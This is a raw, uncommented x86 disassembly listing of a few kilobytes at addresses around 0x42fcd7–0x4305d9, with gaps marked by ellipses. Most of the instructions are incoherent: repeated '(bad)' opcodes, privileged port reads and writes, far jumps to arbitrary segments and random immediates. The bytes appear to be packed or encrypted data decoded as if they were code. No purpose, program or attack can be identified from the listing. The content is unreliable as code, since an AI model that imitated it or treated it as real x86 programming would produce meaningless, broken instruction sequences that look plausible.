  42fcd7:	mov    ebx,0x66cdf4cb
  42fcdc:	shl    DWORD PTR [edi+0x64e4fc9b],1
  42fce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fce3:	pusha  
  42fce4:	and    DWORD PTR [eax-0x76],edx
  42fce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fce8:	pop    esp
  42fce9:	sbb    al,0x4b
  42fceb:	fcom   DWORD PTR [ecx-0x5e1deb7b]
  42fcf1:	mov    eax,0x2c0031ff
  42fcf6:	mov    bl,0x16
  42fcf8:	(bad)  
  42fcf9:	cli    
  42fcfa:	xchg   ebx,eax
  42fcfb:	mov    eax,ds:0xb3e5983a
  42fd00:	cmp    al,0x60
  42fd02:	jns    0x42fca0
  42fd04:	dec    ecx
  42fd05:	or     edx,DWORD PTR [ebx]
  42fd07:	inc    ecx
  42fd08:	repnz or al,0x2
  42fd0b:	dec    edi
  42fd0c:	adc    BYTE PTR [eax+0x5e],cl
  42fd0f:	sbb    dh,0x24
  42fd12:	pop    esi
  42fd13:	cmp    DWORD PTR [esi-0x8],edi
  42fd16:	sub    al,0x9e
  42fd18:	cmp    BYTE PTR [edi],bh
  42fd1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd1b:	pop    edi
  42fd1c:	push   esi
  42fd1d:	push   esi
  42fd1e:	cld    
  42fd1f:	sub    eax,0xa342670a
  42fd24:	rol    DWORD PTR [esi-0x3d],1
  42fd27:	push   eax
  42fd28:	in     al,0xb1
  42fd2a:	xor    BYTE PTR [ebp+ecx*2-0x44cf9524],bl
  42fd31:	push   0x1c
  42fd33:	mov    ebx,0x482cd7ee
  42fd38:	sub    bh,BYTE PTR [esi-0x33d48b37]
  42fd3e:	push   ebp
  42fd3f:	in     al,0x78
  42fd41:	mov    dl,0x1c
  42fd43:	sti    
  42fd44:	shl    ah,0xf8
  42fd47:	xchg   ecx,ebp
  42fd49:	add    ch,BYTE PTR [ebp+0x6bc207a7]
  42fd4f:	fisubr WORD PTR [ecx+0x65]
  42fd52:	mov    edi,0xb2d19878
  42fd57:	daa    
  42fd58:	out    dx,al
  42fd59:	adc    eax,0x6d13676a
  42fd5e:	jge    0x42fda9
  42fd60:	push   0xca03c791
  42fd65:	jmp    0x42fcfc
  42fd67:	ds mov bl,0xa9
  42fd6a:	and    BYTE PTR [edi],al
  42fd6c:	outs   dx,DWORD PTR ds:[esi]
  42fd6d:	mov    edi,0x154cb488
  42fd72:	ss mov eax,0xf2df087e
  42fd78:	sub    al,0x39
  42fd7a:	add    al,0x20
  42fd7c:	jmp    0x42fd23
  42fd7e:	jg     0x42fdb7
  42fd80:	sbb    al,0x44
  42fd82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd83:	xlat   BYTE PTR ds:[ebx]
  42fd84:	jo     0x42fd17
  42fd86:	outs   dx,BYTE PTR ds:[esi]
  42fd87:	xchg   ecx,eax
  42fd88:	int    0xb3
  42fd8a:	shr    al,0xd4
  42fd8d:	fisub  DWORD PTR [ecx+0x36]
  42fd90:	outs   dx,DWORD PTR ds:[esi]
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz cmp eax,0xaeb098ed
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0x19000001,al
  42fe0d:	dec    eax
  42fe0e:	mov    WORD PTR [eax+eiz*4],?
  42fe11:	jns    0x42fd9f
  42fe13:	(bad)
  42fe16:	daa    
  42fe17:	loop   0x42fe52
  42fe19:	scas   eax,DWORD PTR es:[edi]
  42fe1a:	pop    esi
  42fe1b:	cmp    edi,ecx
  42fe1d:	out    0xcb,al
  42fe1f:	ret    0xa5bf
  42fe22:	mov    bl,0x7
  42fe24:	pop    es
  42fe25:	cmp    dl,0xd
  42fe28:	cdq    
  42fe29:	dec    ebp
  42fe2a:	mov    ebp,0xcc7f5b47
  42fe2f:	and    al,0x62
  42fe31:	mov    ebp,0x6da91e60
  42fe36:	sub    BYTE PTR [eax-0x76b776d],bh
  42fe3c:	adc    DWORD PTR [ecx+0x68],0xffffffd7
  42fe40:	jle    0x42fde5
  42fe42:	xor    BYTE PTR [eax+esi*1],0x48
  42fe46:	repnz mov cs,WORD PTR [edi-0x4084f1f0]
  42fe4d:	xchg   ebx,eax
  42fe4e:	int    0x49
  42fe50:	xor    eax,0xec0a4900
  42fe55:	mov    cl,0xce
  42fe57:	adc    BYTE PTR [ebx-0x7b],0xa1
  42fe5b:	adc    eax,0x6bf452b8
  42fe60:	xlat   BYTE PTR ds:[ebx]
  42fe61:	xchg   ebp,eax
  42fe62:	pop    eax
  42fe63:	mov    bh,0x92
  42fe65:	sti    
  42fe66:	data16 and al,0x17
  42fe69:	xor    eax,0xa2cb5201
  42fe6e:	mov    bh,0xa0
  42fe70:	jge    0x42fef1
  42fe72:	cmp    al,0xca
  42fe74:	mov    ecx,DWORD PTR [edi-0x15]
  42fe77:	push   cs
  42fe78:	inc    BYTE PTR [eax-0x77d7e18b]
  42fe7e:	stos   BYTE PTR es:[edi],al
  42fe7f:	into   
  42fe80:	jns    0x42fe59
  42fe82:	mov    BYTE PTR [esi+0x6d287f96],0xf8
  42fe89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe8a:	scas   eax,DWORD PTR es:[edi]
  42fe8b:	cdq    
  42fe8c:	ficomp WORD PTR [esi-0x18956e6e]
  42fe92:	jb     0x42fe76
  42fe94:	mov    WORD PTR [esi-0x72],ds
  42fe97:	dec    ecx
  42fe98:	add    al,0x9c
  42fe9a:	std    
  42fe9b:	shl    al,cl
  42fe9d:	pushf  
  42fe9e:	push   ss
  42fe9f:	call   DWORD PTR [esi]
  42fea1:	jmp    0x92a556be
  42fea6:	inc    eax
  42fea7:	mov    ebp,0xb0cba527
  42feac:	inc    edi
  42fead:	sub    al,0xfb
  42feaf:	and    edi,ebx
  42feb1:	add    al,0x69
  42feb3:	and    BYTE PTR gs:[eax+0x6973ff7d],0x22
  42febb:	jne    0x42fe92
  42febd:	out    dx,al
  42febe:	daa    
  42febf:	inc    ecx
  42fec0:	ds (bad) 
  42fec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fec4:	xor    al,0x42
  42fec6:	push   ecx
  42fec7:	(bad)  
  42fec9:	sub    cl,BYTE PTR [edx+0x1305f4a5]
  42fecf:	xchg   esi,ebx
  42fed1:	adc    ch,BYTE PTR [edx-0x2eefbb59]
  42fed7:	push   ebp
  42fed8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42feda:	lahf   
  42fedb:	in     al,0x25
  42fedd:	pop    ss
  42fede:	fwait
  42fedf:	jne    0x42fe6f
  42fee1:	inc    esp
  42fee2:	mul    ecx
  42fee4:	cmp    BYTE PTR [edx-0x16],cl
  42fee7:	test   eax,0xb345c01a
  42feec:	push   ecx
  42feed:	mov    WORD PTR [ecx],es
  42feef:	ins    BYTE PTR es:[edi],dx
  42fef0:	test   dh,al
  42fef2:	test   eax,0x3bc92663
  42fef7:	outs   dx,BYTE PTR ds:[esi]
  42fef8:	push   esp
  42fef9:	mov    edx,0xe9d3e277
  42fefe:	jmp    0xe4eab4f7
  42ff03:	dec    edi
  42ff04:	mov    WORD PTR [eax+eax*1+0x4b4f740e],cs
  42ff0b:	cbw    
  42ff0d:	pop    edi
  42ff0e:	imul   eax,esi,0x8c
	...
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [esi+ecx*8-0x2a],0x5e
  42ff83:	scas   eax,DWORD PTR es:[edi]
  42ff84:	mov    bl,0x2
  42ff86:	add    al,BYTE PTR [eax]
  42ff88:	add    DWORD PTR [eax],0x0
  42ff8b:	add    BYTE PTR [edx-0x5d],ch
  42ff8e:	dec    esi
  42ff8f:	mov    edx,DWORD PTR ds:0xcd1223dc
  42ff95:	adc    al,0xaa
  42ff97:	iret   
  42ff98:	mov    eax,?
  42ff9a:	loopne 0x42ff9f
  42ff9c:	push   esp
  42ff9d:	mov    ds:0x500fab9a,eax
  42ffa2:	push   ss
  42ffa3:	data16 stc 
  42ffa5:	xor    DWORD PTR [esi-0x29],esi
  42ffa8:	mov    ch,0x84
  42ffaa:	bound  esp,QWORD PTR [ebp-0x37a68f67]
  42ffb0:	fdivr  DWORD PTR [eax-0x4416dc39]
  42ffb6:	cmp    eax,0x8b56510f
  42ffbb:	leave  
  42ffbc:	xor    eax,0x53d9051f
  42ffc1:	add    DWORD PTR [edi-0x29],edx
  42ffc4:	mov    WORD PTR [edi+ebp*1+0x3c],?
  42ffc8:	lock nop
  42ffca:	jl     0x42ff69
  42ffcc:	mov    ds:0x1da75b91,eax
  42ffd1:	out    dx,eax
  42ffd2:	or     DWORD PTR [edi],edi
  42ffd4:	xchg   edi,eax
  42ffd5:	mov    edi,0xcfc5d23e
  42ffda:	cmp    DWORD PTR [ebp+0x25],eax
  42ffdd:	inc    ecx
  42ffde:	ret    0x8865
  42ffe1:	mov    cl,0x16
  42ffe3:	imul   BYTE PTR [ebx-0xeb802ef]
  42ffe9:	lods   eax,DWORD PTR ss:[esi]
  42ffeb:	push   esi
  42ffec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ffed:	add    ch,dh
  42ffef:	mov    ebx,0xa9c54085
  42fff4:	shl    DWORD PTR [edx+edi*4+0x6a],cl
  42fff8:	popa   
  42fff9:	push   cs
  42fffa:	in     al,0x80
  42fffc:	and    al,0x9d
  42fffe:	and    eax,0x4b2cfcf5
  430003:	push   esi
  430004:	xor    esi,ebp
  430006:	scas   eax,DWORD PTR es:[edi]
  430007:	push   edi
  430008:	sub    esp,DWORD PTR [ecx]
  43000a:	xchg   ebx,eax
  43000b:	mov    DWORD PTR [ebx-0x22],esi
  43000e:	adc    eax,0x0
	...
  430073:	add    BYTE PTR [ebp+0x55],cl
  430076:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43007c:	mov    esp,ebp
  43007e:	or     ah,dh
  430080:	dec    ebp
  430081:	add    bh,al
  430083:	add    BYTE PTR [eax],cl
  430085:	add    BYTE PTR [eax],al
  430087:	mov    DWORD PTR [eax],0x40f44545
  43008d:	xor    DWORD PTR [eax],eax
  43008f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430095:	(bad)  
  430096:	enter  0x4d45,0xbc
  43009a:	mov    esi,DWORD PTR [edx]
  43009c:	hlt    
  43009d:	test   ebx,ecx
  43009f:	pushf  
  4300a0:	enter  0x4df8,0x8b
  4300a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4300ab:	inc    ebp
  4300ac:	mov    ebp,0xff8bfffc
  4300b1:	dec    ebp
  4300b2:	mov    ch,0xf4
  4300b4:	call   DWORD PTR [ebx-0x1]
  4300b7:	mov    ebx,0x8005474
  4300bc:	call   DWORD PTR [ecx+0x8]
  4300bf:	pop    es
  4300c0:	jmp    0xb8:0xacb4533
  4300c7:	fwait
  4300c8:	mov    esi,DWORD PTR [edx-0xc]
  4300cb:	xor    cl,bl
  4300cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4300d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4300d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4300df:	xor    eax,DWORD PTR [eax]
  4300e1:	retf   
  4300e2:	retf   
  4300e3:	add    ecx,eax
  4300e5:	enter  0x894d,0x64
  4300e9:	dec    ebp
  4300ea:	sbb    ah,cl
  4300ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4300f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4300f8:	test   DWORD PTR [ebx],esi
  4300fa:	dec    ebx
  4300fc:	inc    DWORD PTR [ebx]
  4300fe:	inc    eax
  4300ff:	enter  0x8989,0x50
  430103:	(bad)  
  430104:	call   DWORD PTR [ebx+ecx*4-0x1]
  430108:	cld    
  430109:	dec    DWORD PTR [ebp-0xa90001]
  43010f:	push   edi
  430110:	mov    BYTE PTR [edx+0x1],ch
  430113:	and    al,BYTE PTR [eax]
  430115:	pop    ecx
  430116:	inc    ebp
  430117:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43011d:	push   0xffffff89
  43011f:	pop    ecx
  430120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430121:	dec    ebp
  430122:	add    BYTE PTR [ecx+0x45fc088b],cl
  430128:	jne    0x430174
  43012a:	lea    eax,[eax]
  43012c:	push   eax
  43012d:	(bad)  
  43012e:	dec    DWORD PTR [eax]
  430130:	mov    DWORD PTR [eax],eax
  430132:	test   al,0x0
  430134:	add    BYTE PTR [ebp-0x18],cl
  430137:	xor    ebp,DWORD PTR [ebx]
  430139:	add    eax,DWORD PTR [eax]
  43013b:	mov    eax,eax
  43013d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430144:	inc    ebp
  430145:	mov    DWORD PTR [ebx+0x459408],ecx
  43014b:	arpl   WORD PTR [ebx-0x372749b],cx
  430151:	sub    al,0x80
  430153:	inc    DWORD PTR [ecx]
  430155:	lea    eax,[eax]
  430157:	or     al,0x0
  430159:	inc    DWORD PTR [ecx-0x18]
  43015c:	mov    ecx,DWORD PTR [ebx]
  43015e:	cld    
  43015f:	add    BYTE PTR [ecx+0x75014d],cl
  430165:	(bad)  
  430166:	xchg   ebp,eax
  430167:	fdivr  st,st(7)
  430169:	inc    eax
  43016a:	inc    DWORD PTR [eax]
  43016c:	mov    ecx,DWORD PTR [ebp-0x4]
  43016f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430175:	add    BYTE PTR [edx],dl
  430177:	enter  0x4d90,0x0
  43017b:	mov    eax,DWORD PTR [eax]
  43017d:	hlt    
  43017e:	add    al,0xa5
  430180:	mov    al,0xff
  430182:	add    bh,bh
  430184:	add    BYTE PTR [ebx],dh
  430186:	inc    DWORD PTR [ebx]
  430188:	sbb    al,0x89
  43018a:	jne    0x430168
  43018c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430192:	mov    eax,DWORD PTR [ebp-0xff0048]
  430198:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43019f:	inc    DWORD PTR [ebp-0x75]
  4301a2:	fisttp QWORD PTR [esi+ebp*8]
  4301a5:	test   DWORD PTR [esi-0x1],esp
  4301a8:	inc    ebp
  4301a9:	(bad)  
  4301aa:	aas    
  4301ab:	inc    ebp
  4301ac:	(bad)  
  4301ad:	lea    edi,[esp+eiz*2-0x1]
  4301b1:	inc    edi
  4301b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4301b9:	mov    ebp,esp
  4301bb:	cld    
  4301bc:	loop   0x43014b
  4301be:	inc    ebp
  4301bf:	(bad)  
  4301c0:	out    dx,al
  4301c1:	(bad)  
  4301c2:	fisttp WORD PTR [eax+0x8801c7]
  4301c8:	jecxz  0x43020f
  4301ca:	in     al,dx
  4301cb:	inc    DWORD PTR [ebp-0x4]
  4301ce:	out    0x8d,eax
  4301d0:	aas    
  4301d1:	inc    edi
  4301d3:	jmp    FWORD PTR [eax-0x78]
  4301d6:	inc    DWORD PTR [ecx]
  4301d8:	mov    DWORD PTR [eax],0xc7043d
  4301de:	ins    BYTE PTR es:[edi],dx
  4301df:	test   edi,edi
  4301e1:	pandn  mm0,mm5
  4301e4:	aas    
  4301e5:	add    bh,al
  4301e7:	mov    esi,DWORD PTR [eax-0x4]
  4301ea:	inc    DWORD PTR [eax+0xdf01ee]
  4301f0:	(bad)  
  4301f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4301f5:	mov    ebp,ebx
  4301f7:	xchg   esp,eax
  4301f8:	fild   DWORD PTR [eax]
  4301fa:	(bad)  
  4301fb:	mov    edi,DWORD PTR [eax+0x3]
  4301fe:	(bad)  
  4301ff:	cmp    al,0xe7
  430201:	dec    ebp
  430202:	leave  
  430203:	mov    ebp,eax
  430205:	fsubr  DWORD PTR [edx]
  430207:	add    BYTE PTR [eax],al
  430209:	lea    ecx,[ebx-0x7f0003b4]
  43020f:	push   edx
  430210:	add    DWORD PTR [ebp+0x0],edx
  430213:	mov    esi,DWORD PTR [eax]
  430215:	mov    WORD PTR [edi],ss
  430217:	add    BYTE PTR [eax],al
  430219:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43021f:	add    ah,bh
  430221:	push   0x7d
  430223:	dec    DWORD PTR [ebx+0xd88c]
  430229:	push   edx
  43022a:	mov    edx,DWORD PTR [ecx-0x4]
  43022d:	call   DWORD PTR [eax+0x7d01fc]
  430233:	mov    esi,DWORD PTR [esi]
  430235:	cld    
  430236:	add    BYTE PTR [eax+0x560150],dl
  43023c:	test   DWORD PTR [ebp+0x75],eax
  43023f:	loop   0x4301cc
  430241:	jmp    0xe38b:0x947dc7fc
  430248:	fsub   st,st(7)
  43024a:	add    bh,al
  43024c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430252:	add    edi,edi
  430254:	add    bh,bh
  430256:	adc    al,0xed
  430258:	add    dh,ah
  43025a:	push   eax
  43025b:	inc    ebp
  43025c:	push   esi
  43025d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430263:	test   BYTE PTR [ebx],dh
  430265:	out    0x5,al
  430267:	shl    BYTE PTR [edx+0x45],0x0
  43026b:	jmp    0x43022e
  43026d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430274:	inc    esi
  430275:	jle    0x430277
  430277:	test   edi,eax
  430279:	(bad)  
  43027a:	call   0x130037e
  43027f:	out    0x75,al
  430281:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430287:	in     al,dx
  430288:	mov    esp,edx
  43028a:	mov    ah,0x85
  43028c:	add    bh,bh
  43028e:	call   0x1292c92
  430293:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43029a:	add    ebx,esp
  43029c:	add    ah,ch
  43029e:	xor    BYTE PTR [ebp-0xff0073],al
  4302a4:	mov    ebx,ebp
  4302a6:	cld    
  4302a7:	jle    0x430232
  4302a9:	add    DWORD PTR gs:[eax],eax
  4302ac:	add    BYTE PTR [eax+0x1],dl
  4302af:	inc    ebp
  4302b0:	inc    ebp
  4302b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4302b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4302bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4302c3:	inc    ebp
  4302c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4302ca:	inc    ebp
  4302cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4302d1:	mov    edi,edi
  4302d3:	mov    eax,0xe80800ff
  4302d8:	inc    ebp
  4302d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4302df:	add    al,0x1
  4302e1:	rol    BYTE PTR [eax],0x1e
  4302e4:	jne    0x43032b
  4302e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4302ec:	inc    DWORD PTR [ecx]
  4302ee:	call   0x882bf3
  4302f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4302f9:	call   0x432cff
  4302fe:	xor    bh,bh
  430300:	push   edi
  430301:	adc    BYTE PTR [ebx-0x74741bbb],al
  430307:	fsub   st,st(4)
  430309:	ret    
  43030a:	loopne 0x4302a7
  43030c:	xor    DWORD PTR [edx],0x31
  43030f:	cmp    edi,edi
  430311:	bswap  eax
  430313:	rol    BYTE PTR gs:[eax],0x5
  430317:	jmp    0x12e0461
  43031c:	mov    eax,DWORD PTR [ebp-0x4]
  43031f:	add    BYTE PTR [eax+0xff0100],bh
  430325:	cld    
  430326:	jne    0x4303a5
  430328:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43032e:	jb     0x430331
  430330:	add    BYTE PTR [eax],al
  430332:	push   eax
  430333:	fild   DWORD PTR [ebp+0x0]
  430336:	mov    edx,DWORD PTR [eax-0x68]
  430339:	inc    ebp
  43033a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430340:	or     bh,bh
  430342:	inc    ebp
  430343:	call   0x1272a47
  430348:	jge    0x430397
  43034a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430350:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430356:	fwait
  430357:	mov    eax,0x30132
  43035c:	lea    esi,[ebp+0x2c]
  43035f:	xor    edi,edi
  430361:	(bad)  
  430362:	call   0x1422ccf
  430367:	call   0x1372cf7
  43036c:	jne    0x4302f9
  43036e:	xor    edi,esp
  430370:	add    eax,DWORD PTR [eax+0xc018d]
  430376:	push   DWORD PTR [eax]
  430378:	call   0xcc2cd4
  43037d:	enter  0x45ff,0xe0
  430381:	mov    ecx,DWORD PTR [ebp-0x28]
  430384:	xor    eax,DWORD PTR [eax]
  430386:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43038c:	(bad)  
  43038d:	xchg   ebp,eax
  43038e:	call   0x1420492
  430393:	mov    cl,0x45
  430395:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43039b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4303a2:	mov    edi,edi
  4303a4:	or     BYTE PTR [eax],cl
  4303a6:	inc    ebp
  4303a7:	test   DWORD PTR gs:[eax],eax
  4303aa:	je     0x4303f1
  4303ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4303b2:	xor    edx,DWORD PTR [eax-0x73]
  4303b5:	push   ebp
  4303b6:	or     BYTE PTR [ebp+0x21007572],al
  4303bc:	inc    ebp
  4303bd:	loopne 0x43034a
  4303bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4303c6:	int    0x0
  4303c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4303ce:	inc    ebp
  4303cf:	push   ebp
  4303d0:	cmp    ebp,eax
  4303d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4303d9:	cld    
  4303da:	fadd   QWORD PTR [eax+0x3b014d]
  4303e0:	jne    0x430412
  4303e2:	push   0xf8898557
  4303e7:	loopne 0x43045e
  4303e9:	inc    ebp
  4303ea:	lea    eax,[ebx+0x72e8e4cc]
  4303f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4303f6:	jmp    0x43042b
  4303f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4303fe:	xor    eax,edi
  430400:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43040a:	rcl    BYTE PTR [eax-0x40],1
  43040d:	inc    ebp
  43040e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430416:	inc    ebp
  430417:	xchg   ebp,eax
  430418:	ud0    ebp,DWORD PTR [ebx]
  43041b:	inc    DWORD PTR [eax]
  43041d:	daa    
  43041e:	jbe    0x430420
  430420:	mov    dl,BYTE PTR [eax-0x80]
  430423:	push   ebp
  430424:	pop    ds
  430425:	mov    ecx,DWORD PTR [esp+esi*8]
  430428:	inc    eax
  430429:	retf   
  43042a:	inc    ebp
  43042b:	iret   
  43042c:	jb     0x4303f6
  43042e:	mov    eax,DWORD PTR [edi]
  430430:	int3   
  430431:	inc    ebp
  430432:	inc    ebp
  430433:	add    DWORD PTR [ecx],esi
  430435:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43043c:	xor    dh,BYTE PTR [ebx]
  43043e:	pushf  
  43043f:	lea    ecx,[ecx+0x4d72d808]
  430445:	add    BYTE PTR [ebx],dh
  430447:	inc    ebp
  430448:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43044e:	xor    dl,BYTE PTR [edx]
  430450:	add    eax,DWORD PTR [ebp-0x77]
  430453:	mov    eax,esp
  430455:	fmul   QWORD PTR [ebp-0x3d]
  430458:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43045f:	mov    DWORD PTR [ebp-0x24],eax
  430462:	rol    DWORD PTR [ebp-0x64],1
  430465:	xor    eax,edi
  430467:	mov    ecx,0xff858db0
  43046c:	clc    
  43046d:	enter  0x4d45,0x3c
  430471:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430478:	test   esi,edi
  43047a:	clc    
  43047b:	inc    DWORD PTR [ebp+0x45]
  43047e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430486:	test   DWORD PTR [ecx],esi
  430488:	clc    
  430489:	pushf  
  43048a:	inc    ebp
  43048b:	(bad)  
  43048c:	cmp    ah,bh
  43048e:	pushf  
  43048f:	inc    ebp
  430490:	mov    edx,DWORD PTR [eax-0x24]
  430493:	add    BYTE PTR [ebp+0x0],dl
  430496:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43049c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4304a0:	add    al,dl
  4304a2:	jmp    0x1040672
  4304a7:	jb     0x4304f6
  4304a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4304af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4304b2:	xor    ecx,DWORD PTR [edi]
  4304b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4304b8:	(bad)  
  4304ba:	clc    
  4304bb:	int3   
  4304bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4304c3:	push   cs
  4304c4:	xor    ecx,eax
  4304c6:	xor    esp,ecx
  4304c8:	add    ebp,DWORD PTR [eax]
  4304ca:	add    esi,DWORD PTR [eax]
  4304cc:	(bad)  
  4304ce:	retf   0x55cc
  4304d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4304d5:	(bad)  
  4304d6:	cli    
  4304d7:	fdiv   st(1),st
  4304d9:	test   DWORD PTR [eax+edi*8],ecx
  4304dc:	dec    ebp
  4304dd:	inc    ebp
  4304de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4304e4:	add    BYTE PTR [ebp+0x0],al
  4304e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4304ea:	mov    ecx,ebx
  4304ec:	clc    
  4304ed:	jne    0x4304ba
  4304ef:	mov    esi,0xd672d3
  4304f4:	into   
  4304f5:	into   
  4304f6:	scas   eax,DWORD PTR es:[edi]
  4304f7:	dec    ebp
  4304f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4304fe:	sub    ecx,esi
  430500:	cmp    ecx,DWORD PTR [ebp+0x77]
  430503:	(bad)  
  430504:	mov    edi,eax
  430506:	mov    al,0x85
  430508:	mov    eax,edi
  43050a:	add    BYTE PTR [ebp-0x75],al
  43050d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430514:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43051a:	(bad)  
  43051c:	retf   0x559c
  43051f:	(bad)  
  430520:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430527:	inc    ebp
  430528:	add    eax,0xeb9c4d3f
  43052d:	(bad)  
  43052e:	mov    ecx,eax
  430530:	lods   al,BYTE PTR ds:[esi]
  430531:	test   DWORD PTR [ebp-0x8],edx
  430534:	xor    ecx,DWORD PTR [ebp+0x33]
  430537:	mov    eax,DWORD PTR [ebx]
  430539:	lock add ecx,ebx
  43053c:	bswap  esi
  43053e:	retf   0x55d1
  430541:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430547:	jmp    0x430542
  430549:	add    BYTE PTR ds:0xebc44d8b,al
  43054f:	push   ebp
  430550:	mov    ebp,DWORD PTR [ebx]
  430552:	test   al,0x8b
  430554:	push   ebp
  430555:	clc    
  430556:	xor    ecx,ebx
  430558:	xor    ecx,esi
  43055a:	add    edx,ecx
  43055c:	add    eax,DWORD PTR [edx+0xca010f]
  430562:	push   ebp
  430563:	dec    ebp
  430564:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43056a:	stc    
  43056b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430571:	scas   eax,DWORD PTR es:[edi]
  430572:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430578:	xor    ebp,DWORD PTR [ebx]
  43057a:	xor    edi,DWORD PTR [ebx]
  43057c:	add    esi,DWORD PTR [edi+0x3]
  43057f:	mov    ecx,DWORD PTR [edi]
  430581:	clc    
  430582:	retf   0x55cb
  430585:	into   
  430586:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43058d:	mov    eax,0x3376554d
  430592:	mov    esi,DWORD PTR [ebx]
  430594:	enter  0x5503,0x3
  430598:	xor    ecx,DWORD PTR [edi]
  43059a:	xor    ecx,edx
  43059c:	add    edx,DWORD PTR [ebp+0x3]
  43059f:	mov    ecx,DWORD PTR [edi]
  4305a1:	lock retf 0x4dfa
  4305a5:	stc    
  4305a6:	mov    ecx,DWORD PTR [eax]
  4305a8:	or     BYTE PTR [ebp+0x4d],cl
  4305ab:	jmp    0x107063b
  4305b0:	dec    ebp
  4305b1:	dec    ebp
  4305b2:	(bad)  
  4305b3:	mov    esp,esp
  4305b5:	clc    
  4305b6:	test   ebx,ecx
  4305b8:	clc    
  4305b9:	ror    DWORD PTR [ebp-0x2a],cl
  4305bc:	mov    esi,ecx
  4305be:	in     al,dx
  4305bf:	scas   eax,DWORD PTR es:[edi]
  4305c0:	inc    ebp
  4305c1:	mov    esi,DWORD PTR [ebx]
  4305c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4305ca:	retf   
  4305cb:	ja     0x43059b
  4305cd:	mov    ebp,DWORD PTR [eax-0x48]
  4305d0:	dec    ebp
  4305d1:	xor    ecx,DWORD PTR [di+0x3]
  4305d5:	mov    ebp,eax
  4305d7:	clc    
  4305d8:	push   ebp
  4305d9:	retf   
